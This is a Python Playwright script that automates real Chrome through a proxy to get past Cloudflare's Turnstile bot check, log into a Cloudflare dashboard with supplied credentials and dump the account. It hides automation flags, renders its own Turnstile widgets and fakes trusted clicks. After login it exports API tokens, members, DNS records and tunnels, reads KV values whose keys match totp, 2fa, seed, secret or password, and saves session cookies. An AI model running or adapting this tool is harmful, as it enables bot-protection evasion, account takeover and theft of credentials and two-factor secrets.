#!/usr/bin/env python3
# Real google-chrome-stable (multi-process) under Xvfb -> operator egress via local CONNECT proxy.
# Egress configurable via UP_SOCKS_* (residential Cliproxy preferred; HK datacenter alternative).
# Goal: pass dash invisible Turnstile, obtain cf_challenge_response (CDP-confirmed), POST /api/v4/login, read-only export.
import os, sys, json, time, re

BASE = os.path.dirname(os.path.abspath(__file__))
EGRESS_TAG = os.environ.get('EGRESS_TAG', 'residential')
OUT = os.path.abspath(os.path.join(BASE, '..', 'out', EGRESS_TAG))
os.makedirs(OUT, exist_ok=True)

def log(*a):
    s = ' '.join(str(x) for x in a)
    print('[TS] ' + s, flush=True)
    try:
        with open(os.path.join(OUT, 'probe.log'), 'a') as f:
            f.write(s + '\n')
    except Exception:
        pass

def dump(name, obj):
    try:
        with open(os.path.join(OUT, name), 'w') as f:
            f.write(obj if isinstance(obj, str) else json.dumps(obj, ensure_ascii=False, indent=1))
        log('SAVED', name)
    except Exception as e:
        log('SAVEERR', name, e)

EMAIL = os.environ['CF_DASH_EMAIL']
PW = os.environ['CF_DASH_PW']
ACCT = os.environ.get('CF_ACCT', '89ac63755373df2dd33dc1f4a52c1de3')
PROXY = os.environ.get('LOCAL_PROXY', 'http://127.0.0.1:8899')
EGRESS_TAG = os.environ.get('EGRESS_TAG', 'residential')
KEY = '0x4AAAAAADlYAGQxVeGSor-h'
T0 = time.time()
def el():
    return '%.0fs' % (time.time() - T0)

def pick_exec():
    for p in ('/usr/bin/google-chrome-stable', '/usr/bin/google-chrome', '/opt/google/chrome/chrome'):
        if os.path.exists(p):
            return p
    return None

def api(page, path, method='GET', body=None):
    try:
        return page.evaluate("""async ([u,m,b])=>{
            try{
              const opt={method:m, credentials:'include', headers:{accept:'application/json'}};
              if(b!==null){opt.headers['content-type']='application/json';opt.body=JSON.stringify(b);}
              const r=await fetch(u,opt); let t=await r.text();
              let sc=[]; try{r.headers.forEach((v,k)=>{if(/set-cookie/i.test(k))sc.push(v);});}catch(e){}
              return {status:r.status, body:t, setcookie:sc};
            }catch(e){return {status:0, body:'ERR '+e.message};}
        }""", [path, method, body])
    except Exception as e:
        return {'status': -1, 'body': 'EVAL ' + str(e)}

def read_inputs(page):
    try:
        return page.evaluate("""()=>{const o={};document.querySelectorAll('input').forEach(i=>{o[i.name||('#'+(i.id||''))]=(i.value||'').slice(0,160);});return o;}""")
    except Exception as e:
        return {'_err': str(e)}

def is_tok_field(k):
    kl = k.lower()
    if 'security_token' in kl:
        return False
    if 'cf_challenge' in kl or 'challenge_response' in kl:
        return True
    if 'turnstile' in kl and ('response' in kl or 'token' in kl):
        return True
    if 'cf-turnstile' in kl or 'captcha' in kl:
        return True
    return False

def main():
    exe = pick_exec()
    log('EGRESS', EGRESS_TAG, 'EXEC', exe)
    from playwright.sync_api import sync_playwright
    with sync_playwright() as p:
        prof = '/tmp/tsprof_' + EGRESS_TAG
        kw = dict(headless=False,
                  args=['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu', '--disable-dbus',
                        '--disable-blink-features=AutomationControlled',
                        '--window-size=1366,900', '--no-first-run', '--no-default-browser-check',
                        '--disable-features=Translate,MediaRouter', '--lang=en-US',
                        '--disable-breakpad', '--disable-crash-reporter'],
                  locale='en-US', timezone_id='Asia/Hong_Kong',
                  viewport={'width': 1366, 'height': 900})
        if PROXY:
            kw['proxy'] = {'server': PROXY, 'bypass': '127.0.0.1,localhost'}
        if exe:
            kw['executable_path'] = exe
        else:
            kw['channel'] = 'chrome'
        ctx = p.chromium.launch_persistent_context(prof, **kw)
        ctx.on('close', lambda: log('CTX_CLOSE', el()))

        # egress trace via the same proxy stack
        try:
            tr = ctx.request.get('https://dash.cloudflare.com/cdn-cgi/trace', timeout=45000)
            log('TRACE', el(), tr.status, (tr.text() or '').replace('\n', ' ')[:300])
        except Exception as e:
            log('TRACEERR', str(e)[:160])

        page = ctx.pages[0] if ctx.pages else ctx.new_page()
        def on_console(m):
            t = m.text
            if re.search(r'turnstile|challenge|captcha|600010|challenge-platform|postMessage|CSP|error', t, re.I):
                log('C', el(), t[:220])
        page.on('console', on_console)
        net = []
        def on_resp(r):
            u = r.url
            if re.search(r'challenge-platform|brunhild|cdn-cgi|turnstile|captcha|api/v4/login|/pat/', u):
                try:
                    net.append({'s': r.status, 'u': u[:240]})
                except Exception:
                    pass
        page.on('response', on_resp)

        log('NAV', el())
        try:
            page.goto('https://dash.cloudflare.com/login', wait_until='domcontentloaded', timeout=120000)
        except Exception as e:
            log('NAVERR', el(), str(e)[:200])
        log('URL', el(), page.url)

        form = False
        for i in range(96):  # up to ~240s for managed challenge on fresh profile
            try:
                if page.evaluate("()=>!!document.querySelector('#email')"):
                    form = True
                    break
            except Exception:
                pass
            if i % 8 == 0:
                log('WAITFORM', el(), page.url[:120])
            page.wait_for_timeout(2500)
        log('FORM', form, el())
        dump('netlog.json', net)

        tok = None
        tok_src = None
        sec = ''
        if form:
            inp = read_inputs(page)
            log('INPUTS', el(), json.dumps(inp)[:600])
            sec = inp.get('security_token', '') or ''
            try:
                page.fill('#email', EMAIL)
                page.fill('#password', PW)
                log('FILLED', el())
            except Exception as e:
                log('FILLERR', str(e)[:120])

            # 1) native flow: poll hidden inputs for the app's own turnstile token
            for s in range(45):  # ~90s
                inp = read_inputs(page)
                sec = inp.get('security_token', sec) or sec
                for k, v in inp.items():
                    if v and len(v) > 12 and is_tok_field(k):
                        tok = v; tok_src = 'native:' + k
                        break
                if tok:
                    break
                if s % 6 == 0:
                    log('WAITNATIVE', el(), json.dumps({k: len(v) for k, v in inp.items() if re.search(r'token|challenge|turnstile', k, re.I)})[:300])
                page.wait_for_timeout(2000)
            log('NATIVE_TOKEN', el(), tok_src, 'len=', len(tok) if tok else 0)

            # 2) explicit invisible render + execute (same sitekey) if native gave nothing useful
            if not tok:
                try:
                    ready = page.evaluate("()=>!!(window.turnstile && window.turnstile.render)")
                    log('TS_API', ready)
                    if ready:
                        page.evaluate("""(key)=>{
                          window.__ts={tok:null,err:null,st:[]};
                          const d=document.createElement('div'); d.id='ts_self';
                          d.style.cssText='position:fixed;left:10px;bottom:10px;z-index:2147483647';
                          document.body.appendChild(d);
                          window.turnstile.render('#ts_self',{sitekey:key,theme:'light',size:'flexible',appearance:'interaction-only',
                            callback:(t)=>{window.__ts.tok=t;window.__ts.st.push('OK:'+t.length);},
                            'error-callback':(e)=>{window.__ts.err=String(e);window.__ts.st.push('ERR:'+String(e));},
                            'timeout-callback':()=>window.__ts.st.push('TIMEOUT')});
                        }""", KEY)
                        for s in range(20):
                            st = page.evaluate("()=>window.__ts?{tok:window.__ts.tok?window.__ts.tok.length:0,err:window.__ts.err,st:window.__ts.st.slice(-2)}:null")
                            if s == 4:
                                try: page.evaluate("()=>{try{window.turnstile.execute('#ts_self');}catch(e){}}")
                                except Exception: pass
                            if st and st.get('tok', 0) > 12:
                                tok = page.evaluate("()=>window.__ts.tok"); tok_src = 'explicit-invisible'
                                break
                            if s % 3 == 0:
                                log('EXPL_TS', el(), json.dumps(st)[:200])
                            page.wait_for_timeout(2000)
                except Exception as e:
                    log('EXPLERR', str(e)[:160])

            # 3) appearance=always + TRUSTED mouse click (real user-activation) experiment
            if not tok:
                try:
                    r = page.evaluate("""(key)=>{
                      const w=document.createElement('div'); w.id='ts_vis';
                      w.style.cssText='position:fixed;left:30px;top:30px;z-index:2147483647;background:#fff;padding:8px;border:2px solid #000;width:360px;height:150px';
                      document.body.appendChild(w);
                      window.__tsv={tok:null,err:null,st:[]};
                      window.turnstile.render('#ts_vis',{sitekey:key,theme:'light',size:'normal',appearance:'always',
                        callback:(t)=>{window.__tsv.tok=t;window.__tsv.st.push('OK:'+t.length);},
                        'error-callback':(e)=>{window.__tsv.err=String(e);window.__tsv.st.push('ERR:'+String(e));},
                        'timeout-callback':()=>window.__tsv.st.push('TIMEOUT')});
                      const f=document.querySelector('#ts_vis iframe');
                      const rc=f?f.getBoundingClientRect():null;
                      return {ok:true, rect: rc?{x:rc.x,y:rc.y,w:rc.width,h:rc.height}:null};
                    }""", KEY)
                    log('RENDER_ALWAYS', el(), json.dumps(r)[:200])
                    page.wait_for_timeout(4000)
                    rc = page.evaluate("()=>{const f=document.querySelector('#ts_vis iframe');if(!f)return null;const r=f.getBoundingClientRect();return {x:r.x,y:r.y,w:r.width,h:r.height};}")
                    log('WIDGET_RECT', el(), json.dumps(rc))
                    click_pts = []
                    if rc:
                        click_pts = [(rc['x'] + 30, rc['y'] + 32), (rc['x'] + rc['w'] / 2, rc['y'] + rc['h'] / 2)]
                    for (cx, cy) in click_pts:
                        try:
                            page.mouse.move(cx - 5, cy - 5); page.wait_for_timeout(200)
                            page.mouse.move(cx, cy); page.wait_for_timeout(120)
                            page.mouse.click(cx, cy)  # trusted input event via browser pipeline
                            log('CLICK', el(), 'at', int(cx), int(cy))
                        except Exception as e:
                            log('CLICKERR', str(e)[:100])
                        for s in range(15):
                            st = page.evaluate("()=>window.__tsv?{tok:window.__tsv.tok?window.__tsv.tok.length:0,err:window.__tsv.err,st:window.__tsv.st.slice(-2)}:null")
                            if st and st.get('tok', 0) > 12:
                                tok = page.evaluate("()=>window.__tsv.tok"); tok_src = 'always-click'
                                break
                            if s % 4 == 0:
                                log('ALWAYS_TS', el(), json.dumps(st)[:200])
                            page.wait_for_timeout(2000)
                        if tok:
                            break
                except Exception as e:
                    log('ALWAYSERR', str(e)[:160])

            # CDP confirmation of cf_challenge_response / token presence
            try:
                cdp = page.context.new_cdp_session(page)
                for k, v in read_inputs(page).items():
                    if v and len(v) > 12 and is_tok_field(k):
                        if not tok:
                            tok = v; tok_src = 'cdp:' + k
                log('CDP_CONFIRM', el(), 'token_src=', tok_src, 'len=', len(tok) if tok else 0)
            except Exception as e:
                log('CDPERR', str(e)[:120])

            dump('netlog_final.json', net)

            if tok:
                bodies = [
                    {'email': EMAIL, 'password': PW, 'cf_challenge_response': tok, 'security_token': sec},
                    {'email': EMAIL, 'password': PW, 'cf_challenge_response': tok},
                ]
                for b in bodies:
                    r = api(page, '/api/v4/login', 'POST', b)
                    log('LOGIN', el(), 'keys=' + ','.join(k for k in b if k not in ('email', 'password')), 'status=', r.get('status'),
                        'resp=', str(r.get('body'))[:350].replace('\n', ' '), 'setcookie=', len(r.get('setcookie') or []))
                    dump('login_resp.json', r)
                    if r.get('status') == 200:
                        break
                    if re.search(r'two.factor|2fa|verification', str(r.get('body')), re.I):
                        break
            else:
                log('NO_TOKEN_SKIP_FETCH', el(), 'egress=' + EGRESS_TAG)

        # session check
        u = api(page, '/api/v4/user')
        log('USER', u.get('status'), str(u.get('body'))[:300].replace('\n', ' '))
        dump('user.json', u.get('body'))
        authed = u.get('status') == 200 and '"email"' in str(u.get('body'))

        if authed:
            log('AUTHED', el(), 'exporting read-only...')
            endpoints = [
                ('accounts', '/api/v4/accounts'),
                ('zones', '/api/v4/zones?account.id=%s&per_page=50' % ACCT),
                ('user_tokens', '/api/v4/user/tokens'),
                ('iam_eval', '/api/v4/user/iam/dash-authz-eval-roles'),
                ('workers_scripts', '/api/v4/accounts/%s/workers/scripts' % ACCT),
                ('kv_namespaces', '/api/v4/accounts/%s/storage/kv/namespaces' % ACCT),
                ('pages_projects', '/api/v4/accounts/%s/pages/projects' % ACCT),
                ('r2_buckets', '/api/v4/accounts/%s/r2/buckets' % ACCT),
                ('cfd_tunnel', '/api/v4/accounts/%s/cfd_tunnel?is_deleted=false' % ACCT),
                ('members', '/api/v4/accounts/%s/members' % ACCT),
            ]
            summary = {}
            for name, path in endpoints:
                r = api(page, path)
                log('EP', name, r.get('status'))
                dump(name + '.json', r.get('body'))
                summary[name] = r.get('status')
            try:
                z = json.loads(api(page, '/api/v4/zones?account.id=%s&per_page=50' % ACCT).get('body') or '{}')
                zl = z.get('result') or []
                log('ZONECOUNT', len(zl))
                allrec = []
                for zone in zl:
                    zid = zone.get('id'); zn = zone.get('name')
                    d = api(page, '/api/v4/zones/%s/dns_records?per_page=100' % zid)
                    try:
                        rec = json.loads(d.get('body') or '{}').get('result') or []
                    except Exception:
                        rec = []
                    log('DNS', zn, d.get('status'), 'records=', len(rec))
                    for x in rec:
                        x['_zone'] = zn
                    allrec.extend(rec)
                dump('dns_records_all.json', allrec)
                summary['dns_records'] = len(allrec)
            except Exception as e:
                log('ZONEERR', str(e)[:160])
            try:
                kvs = json.loads(api(page, '/api/v4/accounts/%s/storage/kv/namespaces' % ACCT).get('body') or '{}').get('result') or []
                log('KVNS', len(kvs))
                kvout = {}
                for ns in kvs:
                    nid = ns.get('id'); title = ns.get('title')
                    k = api(page, '/api/v4/accounts/%s/storage/kv/namespaces/%s/keys?limit=1000' % (ACCT, nid))
                    try:
                        keys = json.loads(k.get('body') or '{}').get('result') or []
                    except Exception:
                        keys = []
                    log('KVKEYS', title, k.get('status'), 'n=', len(keys))
                    vals = {}
                    for kk in keys:
                        kn = kk.get('name', '')
                        if re.search(r'totp|2fa|otp|seed|secret|token|backup|password|key', kn, re.I):
                            vv = api(page, '/api/v4/accounts/%s/storage/kv/namespaces/%s/values/%s' % (ACCT, nid, kn))
                            vals[kn] = (vv.get('body') or '')[:500]
                    kvout[title or nid] = {'keys': [x.get('name') for x in keys][:500], 'sensitive_values': vals}
                dump('kv.json', kvout)
                summary['kv_namespaces'] = len(kvs)
            except Exception as e:
                log('KVERR', str(e)[:160])
            dump('summary.json', summary)
            dump('authed_flag.txt', 'AUTHED=true\n')

        try:
            dump('cookies.json', ctx.cookies())
        except Exception:
            pass
        try:
            ctx.close()
        except Exception:
            pass
        log('END', el())

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        import traceback
        log('FATAL', str(e)[:300])
        log('TB', traceback.format_exc()[-900:])
